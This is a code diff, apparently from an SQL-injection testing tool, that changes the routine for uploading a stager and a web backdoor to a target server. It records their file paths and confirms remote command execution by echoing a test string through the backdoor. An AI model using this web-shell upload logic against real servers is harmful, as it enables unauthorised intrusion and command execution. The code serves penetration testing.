@@ -45,7 +45,9 @@ class Web:
         self.webApi = None
         self.webBaseUrl = None
         self.webBackdoorUrl = None
+        self.webBackdoorFilePath = None
         self.webStagerUrl = None
+        self.webStagerFilePath = None
         self.webDirectory = None
 
     def webBackdoorRunCmd(self, cmd):
@@ -215,11 +217,13 @@ class Web:
                     localPath = directory
                     uriPath = directory[2:] if isWindowsDriveLetterPath(directory) else directory
                     docRoot = docRoot[2:] if isWindowsDriveLetterPath(docRoot) else docRoot
+
                     if docRoot in uriPath:
                         uriPath = uriPath.replace(docRoot, "/")
                         uriPath = "/%s" % normalizePath(uriPath)
                     else:
                         webDir = extractRegexResult(r"//[^/]+?/(?P<result>.*)/.", conf.url)
+
                         if webDir:
                             uriPath = "/%s" % webDir
                         else:
@@ -233,6 +237,7 @@ class Web:
 
                 self.webBaseUrl = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, uriPath)
                 self.webStagerUrl = "%s/%s" % (self.webBaseUrl, stagerName)
+                self.webStagerFilePath = ntToPosixSlashes(normalizePath("%s/%s" % (localPath, stagerName))).replace("//", "/").rstrip('/')
 
                 uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
 
@@ -244,6 +249,7 @@ class Web:
                         warnMsg += "on '%s'" % localPath
                         logger.warn(warnMsg)
                         warned.add(localPath)
+
                     continue
 
                 elif "<%" in uplPage or "<?" in uplPage:
@@ -306,8 +312,16 @@ class Web:
 
                     self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
                     self.webDirectory = localPath
+                    self.webBackdoorFilePath = ntToPosixSlashes(normalizePath("%s/%s" % (localPath, backdoorName))).replace("//", "/").rstrip('/')
 
-                infoMsg = "the backdoor has probably been successfully "
+                testStr = "command execution test"
+                output = self.webBackdoorRunCmd("echo %s" % testStr)
+
+                if testStr in output:
+                    infoMsg = "the backdoor has been successfully "
+                else:
+                    infoMsg = "the backdoor has probably been successfully "
+
                 infoMsg += "uploaded on '%s' - " % self.webDirectory
                 infoMsg += self.webBackdoorUrl
                 logger.info(infoMsg)
